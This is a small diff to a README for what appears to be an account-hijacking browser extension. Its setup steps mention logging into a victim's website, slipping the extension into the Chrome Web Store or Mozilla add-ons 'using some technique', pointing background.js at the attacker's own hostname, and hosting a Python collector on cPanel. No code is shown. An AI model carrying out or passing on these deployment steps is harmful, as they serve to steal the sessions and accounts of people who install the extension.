@@ -53,9 +53,9 @@ now you can login with the website of victime
 
 use some technique to upload extension in chrome web store or addon mozilla
 
-now you need to change  : localhost by your hostname
+now you need to change  : localhost by your hostname in the file background.js
 
-upload the application python in cpanel
+upload the application python in your Cpanel
 
 ## contact : 
 
